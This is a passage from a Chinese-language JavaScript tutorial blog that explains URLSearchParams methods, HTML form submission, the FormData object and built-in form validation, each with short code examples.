<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo: 1</span></span><br><span class="line"><span class="comment">// bar: 2</span></span><br></pre></td></tr></table></figure>
<p><code>URLSearchParams</code>没有实例属性，只有实例方法。</p>
<h5 id="10-4-2-URLSearchParams-toString"><a href="#10-4-2-URLSearchParams-toString" class="headerlink" title="10.4.2 URLSearchParams.toString()"></a>10.4.2 URLSearchParams.toString()</h5><p><code>toString</code>方法返回实例的字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URL(<span class="string">&#x27;https://example.com?foo=1&amp;bar=2&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(url.search);</span><br><span class="line"></span><br><span class="line">params.toString() <span class="comment">// &quot;foo=1&amp;bar=2&#x27;</span></span><br></pre></td></tr></table></figure>
<p>那么需要字符串的场合，会自动调用<code>toString</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="attr">version</span>: <span class="number">2.0</span>&#125;);</span><br><span class="line"><span class="built_in">window</span>.location.href = location.pathname + <span class="string">&#x27;?&#x27;</span> + params;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>location.href</code>赋值时，可以直接使用<code>params</code>对象。这时就会自动调用<code>toString</code>方法。</p>
<h5 id="10-4-3-URLSearchParams-append"><a href="#10-4-3-URLSearchParams-append" class="headerlink" title="10.4.3 URLSearchParams.append()"></a>10.4.3 URLSearchParams.append()</h5><p><code>append()</code>方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.append(<span class="string">&#x27;baz&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=1&amp;bar=2&amp;baz=3&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>append()</code>方法不会识别是否键名已经存在。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.append(<span class="string">&#x27;foo&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=1&amp;bar=2&amp;foo=3&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，查询字符串里面<code>foo</code>已经存在了，但是<code>append</code>依然会追加一个同名键。</p>
<h5 id="10-4-4-URLSearchParams-delete"><a href="#10-4-4-URLSearchParams-delete" class="headerlink" title="10.4.4 URLSearchParams.delete()"></a>10.4.4 URLSearchParams.delete()</h5><p><code>delete()</code>方法用来删除指定的查询参数。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.delete(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=1&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="10-4-5-URLSearchParams-has"><a href="#10-4-5-URLSearchParams-has" class="headerlink" title="10.4.5 URLSearchParams.has()"></a>10.4.5 URLSearchParams.has()</h5><p><code>has()</code>方法返回一个布尔值，表示查询字符串是否包含指定的键名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.has(<span class="string">&#x27;bar&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">params.has(<span class="string">&#x27;baz&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="10-4-6-URLSearchParams-set"><a href="#10-4-6-URLSearchParams-set" class="headerlink" title="10.4.6 URLSearchParams.set()"></a>10.4.6 URLSearchParams.set()</h5><p><code>set()</code>方法用来设置查询字符串的键值。</p>
<p>它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=1&#x27;</span>);</span><br><span class="line">params.set(<span class="string">&#x27;foo&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=2&quot;</span></span><br><span class="line">params.set(<span class="string">&#x27;bar&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=2&amp;bar=3&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>foo</code>是已经存在的键，<code>bar</code>是还不存在的键。</p>
<p>如果有多个的同名键，<code>set</code>会移除现存所有的键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=1&amp;foo=2&#x27;</span>);</span><br><span class="line">params.set(<span class="string">&#x27;foo&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=3&quot;</span></span><br></pre></td></tr></table></figure>
<p>下面是一个替换当前 URL 的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// URL: https://example.com?version=1.0</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(location.search.slice(<span class="number">1</span>));</span><br><span class="line">params.set(<span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;2.0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.history.replaceState(&#123;&#125;, <span class="string">&#x27;&#x27;</span>, location.pathname + <span class="string">`?`</span> + params);</span><br><span class="line"><span class="comment">// URL: https://example.com?version=2.0</span></span><br></pre></td></tr></table></figure>
<h5 id="10-4-7-URLSearchParams-get-，URLSearchParams-getAll"><a href="#10-4-7-URLSearchParams-get-，URLSearchParams-getAll" class="headerlink" title="10.4.7 URLSearchParams.get()，URLSearchParams.getAll()"></a>10.4.7 URLSearchParams.get()，URLSearchParams.getAll()</h5><p><code>get()</code>方法用来读取查询字符串里面的指定键。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=1&#x27;</span>);</span><br><span class="line">params.get(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// &quot;1&quot;</span></span><br><span class="line">params.get(<span class="string">&#x27;bar&#x27;</span>) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是<code>null</code>。</p>
<p>如果有多个的同名键，<code>get</code>返回位置最前面的那个键值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=3&amp;foo=2&amp;foo=1&#x27;</span>);</span><br><span class="line">params.get(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// &quot;3&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，查询字符串有三个<code>foo</code>键，<code>get</code>方法返回最前面的键值<code>3</code>。</p>
<p><code>getAll()</code>方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=1&amp;foo=2&#x27;</span>);</span><br><span class="line">params.getAll(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// [&quot;1&quot;, &quot;2&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，查询字符串有两个<code>foo</code>键，<code>getAll</code>返回的数组就有两个成员。</p>
<h5 id="10-4-8-URLSearchParams-sort"><a href="#10-4-8-URLSearchParams-sort" class="headerlink" title="10.4.8 URLSearchParams.sort()"></a>10.4.8 URLSearchParams.sort()</h5><p><code>sort()</code>方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。</p>
<p>该方法没有返回值，或者说返回值是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;c=4&amp;a=2&amp;b=3&amp;a=1&#x27;</span>);</span><br><span class="line">params.sort();</span><br><span class="line">params.toString() <span class="comment">// &quot;a=2&amp;a=1&amp;b=3&amp;c=4&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果有两个同名的键<code>a</code>，它们之间不会排序，而是保留原始的顺序。</p>
<h5 id="10-4-9-URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries"><a href="#10-4-9-URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries" class="headerlink" title="10.4.9 URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()"></a>10.4.9 URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()</h5><p>这三个方法都返回一个遍历器对象，供<code>for...of</code>循环遍历。它们的区别在于，<code>keys</code>方法返回的是键名的遍历器，<code>values</code>方法返回的是键值的遍历器，<code>entries</code>返回的是键值对的遍历器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> p <span class="keyword">of</span> params.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [&quot;a&quot;, &quot;1&quot;]</span></span><br><span class="line"><span class="comment">// [&quot;b&quot;, &quot;2&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果直接对<code>URLSearchParams</code>进行遍历，其实内部调用的就是<code>entries</code>接口。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params) &#123;&#125;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params.entries()) &#123;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-Location对象，URL对象，URLSearchParams对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0067</title>
    <url>/2021/06/03/%E6%89%93%E5%8D%A10067/</url>
    <content><![CDATA[<p><font color=#733a31>不要轻易向别人诉苦，因为有很多人并不关心，还有很多人听到后会很高兴。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="13-表单，FormData-对象"><a href="#13-表单，FormData-对象" class="headerlink" title="13. 表单，FormData 对象"></a>13. 表单，FormData 对象</h3><h4 id="13-1-表单概述"><a href="#13-1-表单概述" class="headerlink" title="13.1 表单概述"></a>13.1 表单概述</h4><p>表单（<code>&lt;form&gt;</code>）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;/handling-page&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;用户名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;name&quot;</span> name=<span class="string">&quot;user_name&quot;</span> /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;passwd&quot;</span>&gt;密码：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;passwd&quot;</span> name=<span class="string">&quot;user_passwd&quot;</span> /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit_button&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。</p>
<p>用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的<code>name</code>属性，键值是控件的<code>value</code>属性，键名和键值之间由等号连接。比如，用户名输入框的<code>name</code>属性是<code>user_name</code>，<code>value</code>属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对<code>user_name=张三</code>。</p>
<span id="more"></span>
<p>所有的键值对都会提交到服务器。但是，提交的数据格式跟<code>&lt;form&gt;</code>元素的<code>method</code>属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如<code>/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 GET 请求的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /handling-page?user_name=张三&amp;user_passwd=<span class="number">123</span>&amp;submit_button=提交</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>
<p>如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如<code>user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 POST 请求的头信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">POST /handling-page HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">74</span></span><br><span class="line"></span><br><span class="line">user_name=张三&amp;user_passwd=<span class="number">123</span>&amp;submit_button=提交</span><br></pre></td></tr></table></figure>
<p>注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。</p>
<p>点击<code>submit</code>控件，就可以提交表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面表单就包含一个<code>submit</code>控件，点击这个控件，浏览器就会把表单数据向服务器提交。</p>
<p>注意，表单里面的<code>&lt;button&gt;</code>元素如果没有用<code>type</code>属性指定类型，那么默认就是<code>submit</code>控件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;button&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面表单的<code>&lt;button&gt;</code>元素，点击以后也会提交表单。</p>
<p>除了点击<code>submit</code>控件提交表单，还可以用表单元素的<code>submit()</code>方法，通过脚本提交表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">formElement.submit();</span><br></pre></td></tr></table></figure>
<p>表单元素的<code>reset()</code>方法可以重置所有控件的值（重置为默认值）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">formElement.reset()</span><br></pre></td></tr></table></figure>
<h4 id="13-2-FormData-对象"><a href="#13-2-FormData-对象" class="headerlink" title="13.2 FormData 对象"></a>13.2 FormData 对象</h4><h5 id="13-2-1-概述"><a href="#13-2-1-概述" class="headerlink" title="13.2.1 概述"></a>13.2.1 概述</h5><p>表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。</p>
<p><code>FormData()</code>首先是一个构造函数，用来生成表单的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> formdata = <span class="keyword">new</span> FormData(form);</span><br></pre></td></tr></table></figure>
<p><code>FormData()</code>构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。</p>
<p>下面是一个表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;myForm&quot;</span> name=<span class="string">&quot;myForm&quot;</span>&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;用户名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;useracc&quot;</span>&gt;账号：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;useracc&quot;</span> name=<span class="string">&quot;useracc&quot;</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;userfile&quot;</span>&gt;上传文件：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;userfile&quot;</span> name=<span class="string">&quot;userfile&quot;</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit!&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>我们用<code>FormData()</code>处理上面这个表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myForm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myForm&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(myForm);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取某个控件的值</span></span><br><span class="line">formData.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置某个控件的值</span></span><br><span class="line">formData.set(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"></span><br><span class="line">formData.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;张三&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="13-2-2-实例方法"><a href="#13-2-2-实例方法" class="headerlink" title="13.2.2 实例方法"></a>13.2.2 实例方法</h5><p>FormData 提供以下实例方法。</p>
<ul>
<li><code>FormData.get(key)</code>：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。</li>
<li><code>FormData.getAll(key)</code>：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。</li>
<li><code>FormData.set(key, value)</code>：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.delete(key)</code>：删除一个键值对，参数为键名。</li>
<li><code>FormData.append(key, value)</code>：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.has(key)</code>：返回一个布尔值，表示是否具有该键名的键值对。</li>
<li><code>FormData.keys()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键名。</li>
<li><code>FormData.values()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值。</li>
<li><code>FormData.entries()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值对。如果直接用<code>for...of</code>循环遍历 FormData 实例，默认就会调用这个方法。</li>
</ul>
<p>下面是<code>get()</code>、<code>getAll()</code>、<code>set()</code>、<code>append()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line">formData.set(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">formData.append(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line">formData.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// &quot;张三&quot;</span></span><br><span class="line">formData.getAll(<span class="string">&#x27;username&#x27;</span>) <span class="comment">// [&quot;张三&quot;, &quot;李四&quot;]</span></span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">&#x27;userpic[]&#x27;</span>, myFileInput.files[<span class="number">0</span>], <span class="string">&#x27;user1.jpg&#x27;</span>);</span><br><span class="line">formData.append(<span class="string">&#x27;userpic[]&#x27;</span>, myFileInput.files[<span class="number">1</span>], <span class="string">&#x27;user2.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>下面是遍历器的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">formData.append(<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;value1&#x27;</span>);</span><br><span class="line">formData.append(<span class="string">&#x27;key2&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> formData.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;key1&quot;</span></span><br><span class="line"><span class="comment">// &quot;key2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> formData.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;value1&quot;</span></span><br><span class="line"><span class="comment">// &quot;value2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> pair <span class="keyword">of</span> formData.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pair[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + pair[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// key1: value1</span></span><br><span class="line"><span class="comment">// key2: value2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于遍历 formData.entries()</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> pair <span class="keyword">of</span> formData) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pair[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + pair[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// key1: value1</span></span><br><span class="line"><span class="comment">// key2: value2</span></span><br></pre></td></tr></table></figure>
<h4 id="13-3-表单的内置验证"><a href="#13-3-表单的内置验证" class="headerlink" title="13.3 表单的内置验证"></a>13.3 表单的内置验证</h4><h5 id="13-3-1-自动校验"><a href="#13-3-1-自动校验" class="headerlink" title="13.3.1 自动校验"></a>13.3.1 自动校验</h5><p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- 必填 --&gt;</span><br><span class="line">&lt;input required&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须符合正则表达式 --&gt;</span><br><span class="line">&lt;input pattern=<span class="string">&quot;banana|cherry&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 字符串长度必须为<span class="number">6</span>个字符 --&gt;</span><br><span class="line">&lt;input minlength=<span class="string">&quot;6&quot;</span> maxlength=<span class="string">&quot;6&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 数值必须在<span class="number">1</span>到<span class="number">10</span>之间 --&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;number&quot;</span> min=<span class="string">&quot;1&quot;</span> max=<span class="string">&quot;10&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 Email 地址 --&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 URL --&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;URL&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">input:invalid &#123;</span><br><span class="line">  border-color: red;</span><br><span class="line">&#125;</span><br><span class="line">input,</span><br><span class="line">input:valid &#123;</span><br><span class="line">  border-color: #ccc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="13-3-2-checkValidity"><a href="#13-3-2-checkValidity" class="headerlink" title="13.3.2 checkValidity()"></a>13.3.2 checkValidity()</h5><p>除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 触发整个表单的校验</span></span><br><span class="line">form.checkValidity()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发单个表单控件的校验</span></span><br><span class="line">formControl.checkValidity()</span><br></pre></td></tr></table></figure>
<p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitForm</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">  form.action = action;</span><br><span class="line">  <span class="keyword">if</span> (form.checkValidity()) &#123;</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="13-3-3-willValidate-属性"><a href="#13-3-3-willValidate-属性" class="headerlink" title="13.3.3 willValidate 属性"></a>13.3.3 willValidate 属性</h5><p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form novalidate&gt;</span></span><br><span class="line"><span class="comment">//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;</span></span><br><span class="line"><span class="comment">// &lt;/form&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#name&#x27;</span>);</span><br><span class="line">input.willValidate <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
